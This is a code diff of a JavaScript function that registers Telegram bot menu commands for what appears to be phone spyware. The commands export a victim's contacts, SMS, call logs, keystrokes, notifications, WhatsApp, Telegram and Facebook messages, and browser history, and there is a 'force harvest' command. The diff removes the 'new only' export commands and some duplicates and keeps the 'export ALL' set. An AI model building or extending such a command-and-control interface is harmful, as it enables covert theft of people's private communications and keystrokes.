@@ -746,18 +746,7 @@ async function setChatMenuButton(chatId) {
         { command: 'audio_medium', description: '🎤 Medium quality (32 kbps)' },
         { command: 'audio_high', description: '🎤 High quality (64 kbps)' },
         
-        // ============ DATA EXPORT - NEW ONLY ============
-        { command: 'contacts', description: '📇 Export new contacts' },
-        { command: 'sms', description: '💬 Export new SMS' },
-        { command: 'calllogs', description: '📞 Export new call logs' },
-        { command: 'apps_list', description: '📱 Export new apps' },
-        { command: 'keys', description: '⌨️ Export new keystrokes' },
-        { command: 'notify', description: '🔔 Export new notifications' },
-        { command: 'open_app', description: '📱 Export new app opens' },
-        { command: 'whatsapp', description: '💬 Export new WhatsApp messages' },
-        { command: 'telegram', description: '💬 Export new Telegram messages' },
-        { command: 'facebook', description: '💬 Export new Facebook messages' },
-        { command: 'browser', description: '🌐 Export new browser history' },
+ 
         
         // ============ DATA EXPORT - ALL DATA ============
         { command: 'contacts_all', description: '📇 Export ALL contacts' },
@@ -798,7 +787,6 @@ async function setChatMenuButton(chatId) {
         { command: 'sync_all', description: '🔄 Sync all data' },
         { command: 'force_harvest', description: '⚡ Force data harvest' },
         { command: 'stats', description: '📊 Database statistics' },
-        { command: 'logs_count', description: '📊 Database statistics' },
         { command: 'clear_logs', description: '🗑️ Clear all logs' },
         { command: 'set_sync_interval', description: '⚙️ Set sync interval (minutes)' },
         
@@ -830,9 +818,7 @@ async function setChatMenuButton(chatId) {
         { command: 'force_register_complete', description: '🔄 Force re-registration' },
         
         // ============ COMMAND MANAGEMENT ============
-        { command: 'pending', description: '📊 Show pending commands' },
-        { command: 'pending_commands', description: '📊 Show pending commands' },
-        { command: 'check_pending', description: '📊 Show pending commands' }
+        { command: 'pending', description: '📊 Show pending commands' }
     ];
     
     // Set bot commands (visible in menu)
